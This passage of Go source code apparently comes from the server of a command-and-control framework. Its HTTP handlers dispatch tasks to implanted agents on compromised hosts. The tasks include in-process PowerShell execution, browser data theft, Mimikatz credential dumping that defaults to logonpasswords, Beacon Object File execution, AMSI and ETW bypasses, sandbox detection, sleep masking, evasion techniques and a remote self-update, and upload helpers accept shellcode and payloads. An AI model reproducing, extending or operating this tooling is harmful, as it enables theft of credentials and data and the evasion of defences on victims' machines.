		slog.Info("Persistence remove requested", "agent_id", id, "method", method)
		s.LogAuditRecord(c, "persistence_remove", "agent", id, "Persistence remove: "+method, true, nil)
		s.dispatchTask(c, task, "persistence_remove", method)

	default:
		respondError(c, http.StatusBadRequest, "invalid action: must be add, list, or remove")
	}
}

// 鈹€鈹€ PowerPick: Execute PowerShell script in-process 鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€
func (s *Server) handlePowerPick(c *gin.Context) {
	if !s.requireOperator(c) {
		return
	}
	id := c.Param("id")
	script := c.PostForm("script")
	if script == "" {
		script = c.PostForm("command")
	}
	if script == "" {
		respondError(c, http.StatusBadRequest, "script is required")
		return
	}
	if _, ok := s.getAgentOrFail(c, id); !ok {
		return
	}

	b64Script := base64.StdEncoding.EncodeToString([]byte(script))
	task, err := s.createTask(id, "powerpick", b64Script, "", "", "", 0, 0)
	if err != nil {
		slog.Error("Failed to create powerpick task", "agent_id", id, "error", err)
		respondError(c, http.StatusInternalServerError, "failed to create task")
		return
	}

	slog.Info("PowerPick requested", "agent_id", id, "script_len", len(script))
	s.LogAuditRecord(c, "powerpick", "agent", id, fmt.Sprintf("PowerPick script (%d bytes)", len(script)), true, nil)
	s.dispatchTask(c, task, "powerpick", fmt.Sprintf("PowerPick (%d bytes)", len(script)))
}

// 鈹€鈹€ Browser Data Theft 鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€
func (s *Server) handleBrowserSteal(c *gin.Context) {
	s.createOneParamTask(c, oneParamTaskDef{
		taskType:      "browser_steal",
		audit:         "browser_steal",
		defaultValue:  "all",
		auditDetailFn: func(val string) string { return "Browser steal: " + val },
	})
}

func (s *Server) handleMimikatz(c *gin.Context) {
	if !s.requireOperator(c) {
		return
	}
	id := c.Param("id")
	cmd := c.PostForm("command")
	if cmd == "" {
		cmd = c.PostForm("target")
	}
	if cmd == "" {
		cmd = "sekurlsa::logonpasswords"
	}
	if _, ok := s.getAgentOrFail(c, id); !ok {
		return
	}
	// Auto-attach local module (data/modules/Invoke-Mimikatz.ps1) — no remote IEX.
	moduleB64 := s.loadMimikatzModuleB64()
	task, err := s.createTask(id, "mimikatz", cmd, "", "", moduleB64, 0, 0)
	if err != nil {
		slog.Error("Failed to create mimikatz task", "agent_id", id, "error", err)
		respondError(c, http.StatusInternalServerError, "failed to create task")
		return
	}
	detail := "Mimikatz: " + cmd
	if moduleB64 != "" {
		detail += " (module attached)"
	} else {
		detail += " (no server module; implant needs local script)"
	}
	slog.Info("mimikatz requested", "agent_id", id, "module_attached", moduleB64 != "")
	s.LogAuditRecord(c, "mimikatz", "agent", id, detail, true, nil)
	s.dispatchTask(c, task, "mimikatz", detail)
}

// 鈹€鈹€ BOF: Upload and execute Beacon Object File 鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€
func (s *Server) handleNetCommand(c *gin.Context) {
	if !s.requireOperator(c) {
		return
	}
	id := c.Param("id")
	command := c.PostForm("command")
	if command == "" {
		respondError(c, http.StatusBadRequest, "command is required (e.g. view, group /domain, localgroup Administrators, user, accounts, share)")
		return
	}
	if _, ok := s.getAgentOrFail(c, id); !ok {
		return
	}
	task, err := s.createTask(id, "net", command, "", "", "", 0, 0)
	if err != nil {
		slog.Error("Failed to create net task", "agent_id", id, "error", err)
		respondError(c, http.StatusInternalServerError, "failed to create task")
		return
	}
	slog.Info("Net command requested", "agent_id", id, "command", command)
	s.LogAuditRecord(c, "net", "agent", id, "Net: "+command, true, nil)
	s.dispatchTask(c, task, "net", "Net: "+command)
}

func (s *Server) handleBOF(c *gin.Context) {
	if !s.requireOperator(c) {
		return
	}
	id := c.Param("id")
	if _, ok := s.getAgentOrFail(c, id); !ok {
		return
	}

	filename, b64Data, size, ok := s.handleFileUpload(c, "bof")
	if !ok {
		return
	}
	args := c.PostForm("args")

	task, err := s.createTask(id, "bof", args, "", "", b64Data, 0, 0)
	if err != nil {
		respondError(c, http.StatusInternalServerError, "failed to create task")
		return
	}
	slog.Info("BOF execution requested", "agent_id", id, "file", filename, "size", size, "args", args)
	s.LogAuditRecord(c, "bof", "agent", id, fmt.Sprintf("BOF: %s (%d bytes) args=%s", filename, size, args), true, nil)
	c.JSON(http.StatusOK, gin.H{"success": true, "task_id": task.ID, "message": fmt.Sprintf("BOF %s dispatched", filename)})
}

// 鈹€鈹€ AMSI/ETW Bypass 鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€

func (s *Server) handleAMSIByPass(c *gin.Context) {
	if !s.requireOperator(c) {
		return
	}
	id := c.Param("id")
	if _, ok := s.getAgentOrFail(c, id); !ok {
		return
	}
	task, err := s.createTask(id, "amsi_bypass", "", "", "", "", 0, 0)
	if err != nil {
		slog.Error("Failed to create amsi_bypass task", "agent_id", id, "error", err)
		respondError(c, http.StatusInternalServerError, "failed to create task")
		return
	}
	slog.Info("AMSI bypass requested", "agent_id", id)
	s.LogAuditRecord(c, "amsi_bypass", "agent", id, "AMSI bypass requested", true, nil)
	s.dispatchTask(c, task, "amsi_bypass", "AMSI Bypass")
}

func (s *Server) handleETWByPass(c *gin.Context) {
	if !s.requireOperator(c) {
		return
	}
	id := c.Param("id")
	if _, ok := s.getAgentOrFail(c, id); !ok {
		return
	}
	task, err := s.createTask(id, "etw_bypass", "", "", "", "", 0, 0)
	if err != nil {
		slog.Error("Failed to create etw_bypass task", "agent_id", id, "error", err)
		respondError(c, http.StatusInternalServerError, "failed to create task")
		return
	}
	slog.Info("ETW bypass requested", "agent_id", id)
	s.LogAuditRecord(c, "etw_bypass", "agent", id, "ETW bypass requested", true, nil)
	s.dispatchTask(c, task, "etw_bypass", "ETW Bypass")
}

func (s *Server) handleAMSIHardwareBP(c *gin.Context) {
	if !s.requireOperator(c) {
		return
	}
	id := c.Param("id")
	if _, ok := s.getAgentOrFail(c, id); !ok {
		return
	}
	task, err := s.createTask(id, "amsi_hardware_bp", "", "", "", "", 0, 0)
	if err != nil {
		slog.Error("Failed to create amsi_hardware_bp task", "agent_id", id, "error", err)
		respondError(c, http.StatusInternalServerError, "failed to create task")
		return
	}
	slog.Info("AMSI hardware breakpoint requested", "agent_id", id)
	s.LogAuditRecord(c, "amsi_hardware_bp", "agent", id, "AMSI hardware breakpoint bypass requested", true, nil)
	s.dispatchTask(c, task, "amsi_hardware_bp", "AMSI Hardware Breakpoint")
}

func (s *Server) handleETWHardwareBP(c *gin.Context) {
	if !s.requireOperator(c) {
		return
	}
	id := c.Param("id")
	if _, ok := s.getAgentOrFail(c, id); !ok {
		return
	}
	task, err := s.createTask(id, "etw_hardware_bp", "", "", "", "", 0, 0)
	if err != nil {
		slog.Error("Failed to create etw_hardware_bp task", "agent_id", id, "error", err)
		respondError(c, http.StatusInternalServerError, "failed to create task")
		return
	}
	slog.Info("ETW hardware breakpoint requested", "agent_id", id)
	s.LogAuditRecord(c, "etw_hardware_bp", "agent", id, "ETW hardware breakpoint bypass requested", true, nil)
	s.dispatchTask(c, task, "etw_hardware_bp", "ETW Hardware Breakpoint")
}

func (s *Server) handleRunEvasion(c *gin.Context) {
	if !s.requireOperator(c) {
		return
	}
	id := c.Param("id")
	if _, ok := s.getAgentOrFail(c, id); !ok {
		return
	}

	technique := c.PostForm("technique")
	if technique == "" {
		technique = c.Query("technique")
	}
	if technique == "" {
		respondError(c, http.StatusBadRequest, "technique parameter required")
		return
	}

	task, err := s.createTask(id, "run_evasion", technique, "", "", "", 0, 0)
	if err != nil {
		slog.Error("Failed to create run_evasion task", "agent_id", id, "technique", technique, "error", err)
		respondError(c, http.StatusInternalServerError, "failed to create task")
		return
	}
	slog.Info("Run evasion requested", "agent_id", id, "technique", technique)
	s.LogAuditRecord(c, "run_evasion", "agent", id, "Run evasion: "+technique, true, nil)
	s.dispatchTask(c, task, "run_evasion", "Run Evasion: "+technique)
}

func (s *Server) handleSandboxDetectAdvanced(c *gin.Context) {
	if !s.requireOperator(c) {
		return
	}
	id := c.Param("id")
	if _, ok := s.getAgentOrFail(c, id); !ok {
		return
	}
	task, err := s.createTask(id, "sandbox_detect_advanced", "", "", "", "", 0, 0)
	if err != nil {
		slog.Error("Failed to create sandbox_detect_advanced task", "agent_id", id, "error", err)
		respondError(c, http.StatusInternalServerError, "failed to create task")
		return
	}
	slog.Info("Advanced sandbox detection requested", "agent_id", id)
	s.LogAuditRecord(c, "sandbox_detect_advanced", "agent", id, "Advanced sandbox detection requested", true, nil)
	s.dispatchTask(c, task, "sandbox_detect_advanced", "Advanced Sandbox Detection")
}

func (s *Server) handleSetSleepMaskAdvanced(c *gin.Context) {
	if !s.requireOperator(c) {
		return
	}
	id := c.Param("id")
	if _, ok := s.getAgentOrFail(c, id); !ok {
		return
	}
	task, err := s.createTask(id, "set_sleep_mask_advanced", "", "", "", "", 0, 0)
	if err != nil {
		slog.Error("Failed to create set_sleep_mask_advanced task", "agent_id", id, "error", err)
		respondError(c, http.StatusInternalServerError, "failed to create task")
		return
	}
	slog.Info("Advanced sleep mask requested", "agent_id", id)
	s.LogAuditRecord(c, "set_sleep_mask_advanced", "agent", id, "Advanced sleep mask activation requested", true, nil)
	s.dispatchTask(c, task, "set_sleep_mask_advanced", "Advanced Sleep Mask")
}

// 鈹€鈹€ Self-Update 鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€

func (s *Server) handleSelfUpdate(c *gin.Context) {
	if !s.requireOperator(c) {
		return
	}
	id := c.Param("id")
	url := c.PostForm("url")
	if url == "" {
		respondError(c, http.StatusBadRequest, "download URL is required")
		return
	}
	if _, ok := s.getAgentOrFail(c, id); !ok {
		return
	}
	task, err := s.createTask(id, "self_update", url, "", "", "", 0, 0)
	if err != nil {
		slog.Error("Failed to create self_update task", "agent_id", id, "error", err)
		respondError(c, http.StatusInternalServerError, "failed to create task")
		return
	}
	slog.Info("Self-update requested", "agent_id", id, "url", url)
	s.LogAuditRecord(c, "self_update", "agent", id, "Self-update: "+url, true, nil)
	s.dispatchTask(c, task, "self_update", "Self-Update ("+url+")")
}

// simpleTaskDef defines a basic task with no extra parameters
type simpleTaskDef struct {
	taskType string // e.g. "ps", "reboot"
	audit    string // e.g. "request_ps", "reboot"
	details  string // audit detail string
}

// createSimpleTask creates and dispatches a parameterless agent task
func (s *Server) createSimpleTask(c *gin.Context, id string, def simpleTaskDef) bool {
	if !s.requireOperator(c) {
		return false
	}
	if _, ok := s.getAgentOrFail(c, id); !ok {
		return false
	}
	task, err := s.createTask(id, def.taskType, "", "", "", "", 0, 0)
	if err != nil {
		slog.Error("Failed to create task", "type", def.taskType, "agent_id", id, "error", err)
		respondError(c, http.StatusInternalServerError, "failed to create task")
		return false
	}
	slog.Info(def.taskType+" requested", "agent_id", id)
	s.dispatchTask(c, task, def.audit, def.details)
	return true
}

// oneParamTaskDef defines a task that reads a single value from a form field
// (trying "command" then "target"), with an optional default and custom detail formatter.
type oneParamTaskDef struct {
	taskType      string
	audit         string
	paramField1   string                  // primary form field name (empty = "command")
	paramField2   string                  // fallback form field name (empty = "target")
	defaultValue  string                  // used when both fields are empty
	required      bool                    // if true, return 400 when empty
	auditDetailFn func(val string) string // optional custom detail formatter (nil = use raw value)
}

// createOneParamTask reads a single parameter from form fields and dispatches the task.
func (s *Server) createOneParamTask(c *gin.Context, def oneParamTaskDef) bool {
	if !s.requireOperator(c) {
		return false
	}
	id := c.Param("id")
	field1 := def.paramField1
	if field1 == "" {
		field1 = "command"
	}
	field2 := def.paramField2
	if field2 == "" {
		field2 = "target"
	}

	val := c.PostForm(field1)
	if val == "" {
		val = c.PostForm(field2)
	}
	if val == "" {
		val = def.defaultValue
	}
	if def.required && val == "" {
		respondError(c, http.StatusBadRequest, def.taskType+" requires a parameter")
		return false
	}

	if _, ok := s.getAgentOrFail(c, id); !ok {
		return false
	}

	task, err := s.createTask(id, def.taskType, val, "", "", "", 0, 0)
	if err != nil {
		slog.Error("Failed to create task", "type", def.taskType, "agent_id", id, "error", err)
		respondError(c, http.StatusInternalServerError, "failed to create task")
		return false
	}

	detail := val
	if def.auditDetailFn != nil {
		detail = def.auditDetailFn(val)
	}
	slog.Info(def.taskType+" requested", "agent_id", id, "param", val)
	s.dispatchTask(c, task, def.audit, detail)
	return true
}

// validateCommandArg rejects values that could break the agent's `|`-delimited
// command parsing or abuse field sizes. Applies to free-form command args such
// as injection techniques and spawn targets.
func validateCommandArg(v string, maxLen int, field string) error {
	if len(v) > maxLen {
		return fmt.Errorf("%s too long (max %d characters)", field, maxLen)
	}
	if strings.ContainsAny(v, "|\x00\r\n\t") {
		return fmt.Errorf("%s contains invalid characters", field)
	}
	return nil
}

// allowedUploadExtensions maps field names to their allowed file extensions.
// This prevents arbitrary file uploads that could be used as attack vectors.
var allowedUploadExtensions = map[string][]string{
	"shellcode": {".bin", ".raw", ".dat", ".sc", ".exe", ".dll", ".c", ".txt"},
	"assembly":  {".exe", ".dll", ".csproj", ".zip", ".txt"},
	"bof":       {".o", ".bin", ".dat", ".txt"},
	"file":      {".txt", ".csv", ".json", ".xml", ".log", ".ps1", ".bat", ".cmd", ".vbs", ".js", ".py", ".rb", ".sh", ".c", ".h", ".bin"},
	"payload":   {".exe", ".dll", ".ps1", ".sh", ".bin", ".dat"},
	"config":    {".yaml", ".yml", ".json", ".xml", ".ini", ".conf", ".toml"},
}

// validateUploadExtension checks whether the file extension is allowed for the given field.
func validateUploadExtension(fieldName, filename string) error {
	allowed, ok := allowedUploadExtensions[fieldName]
	if !ok {
		// Unknown field: allow common text/binary extensions only
		allowed = []string{".txt", ".bin", ".dat", ".csv", ".json", ".xml", ".log", ".ps1", ".bat", ".sh", ".c", ".h"}
	}
	lower := strings.ToLower(filename)
	actualExt := filepath.Ext(lower)
	for _, ext := range allowed {
		if actualExt == ext {
			return nil
		}
	}
	return fmt.Errorf("file extension not allowed for %s: %s (allowed: %s)", fieldName, actualExt, strings.Join(allowed, ", "))
}

// validateUploadMagicBytes reads the first 16 bytes and rejects obviously dangerous content.
// This is a defense-in-depth check; extension validation is the primary gate.
func validateUploadMagicBytes(fieldName, filename string, data []byte) error {
	if len(data) < 4 {
		return nil // too short to matter
	}
	// Reject PE executables uploaded as shellcode/bof (should be raw bytes)
	dangerous := map[string][]string{
		"shellcode": {"MZ", "PK"}, // .exe, .zip disguised as shellcode
		"bof":       {"MZ", "PK"},
		"assembly":  {"PK"},
	}
	badPrefixes, ok := dangerous[fieldName]
	if !ok {
		return nil
	}
	for _, prefix := range badPrefixes {
		if string(data[:min(len(data), len(prefix))]) == prefix {
			ext := filepath.Ext(filename)
			if ext == ".exe" || ext == ".dll" || ext == ".zip" {
				continue // allowed by extension, don't reject
			}
			return fmt.Errorf("suspicious file content for %s (magic bytes match %s)", fieldName, prefix)
		}
	}
	return nil
}

func min(a, b int) int {
	if a < b {
		return a
	}
	return b
}

// handleFileUpload reads an uploaded file from a form field and returns base64 content.
// fieldName is the form field name (e.g. "shellcode", "assembly", "bof").
func (s *Server) handleFileUpload(c *gin.Context, fieldName string) (filename, b64Data string, size int64, ok bool) {
	file, err := c.FormFile(fieldName)
	if err != nil {
		respondError(c, http.StatusBadRequest, fieldName+" file required")
		return
	}
	if file.Size > MaxUploadSize {
		respondError(c, http.StatusBadRequest, fmt.Sprintf("file too large: %d bytes (max %d)", file.Size, MaxUploadSize))
		return
	}

	// Validate file extension before reading content
	if err := validateUploadExtension(fieldName, file.Filename); err != nil {
		respondError(c, http.StatusBadRequest, "invalid file extension for "+fieldName)
		return
	}

	f, err := file.Open()
	if err != nil {
		respondError(c, http.StatusInternalServerError, "failed to read "+fieldName)
		return
	}
	defer f.Close()
	data, err := io.ReadAll(f)
	if err != nil {
		respondError(c, http.StatusInternalServerError, "failed to read "+fieldName+" data")
		return
	}

	// Validate magic bytes for defense-in-depth
	if err := validateUploadMagicBytes(fieldName, file.Filename, data); err != nil {
		respondError(c, http.StatusBadRequest, "file content does not match expected type")
		return
	}

	filename = file.Filename
	size = int64(len(data))
	b64Data = base64.StdEncoding.EncodeToString(data)
	ok = true
	return
}
